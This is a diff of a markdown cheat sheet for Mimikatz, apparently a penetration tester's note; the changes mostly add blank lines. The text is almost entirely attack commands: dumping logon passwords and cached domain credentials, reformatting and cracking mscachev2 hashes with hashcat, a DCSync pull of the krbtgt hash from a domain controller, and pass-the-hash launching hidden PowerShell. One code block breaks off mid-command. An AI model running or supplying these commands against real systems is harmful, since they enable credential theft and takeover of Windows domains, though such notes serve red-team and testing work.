@@ -9,14 +9,28 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # Mimikatz Cheatsheet
 
+
+
 **Code**: [[
 sekurlsa::wdigest
 sekurlsa::logonpasswords
 lsadum]]
 
+
+
+
+
+
+
 **Code**: [[
 lsadump::cache
 ]]
+
+
+
+
+
+
 
 **Command** ([[Format mscachev2 as `$DCC2$10240#username#hash`]]):
 
@@ -25,12 +39,24 @@ cat 'mscachecreds.txt' | awk -F “:” {'print "$DCC2$10240#"$1"#"$2'}
 
 ```
 
+
+
+
+
+
+
 **Command** ([[hashcat Crack mscachev2 format (extremely slow)]]):
 
 ```bash
 hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
 
 ```
+
+
+
+
+
+
 
 **Command** ([[mimikatz DCSYNC Remote Hash Dumping from a Domain Controller]]):
 
@@ -39,9 +65,21 @@ mimikatz lsadump::dcsync /user:domain\krbtgt
 
 ```
 
+
+
+
+
+
+
 **Command** ([[mimikatz Pass the Hash]]):
 
 ```powershell
 mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
 
 ```
+
+
+
+
+
+
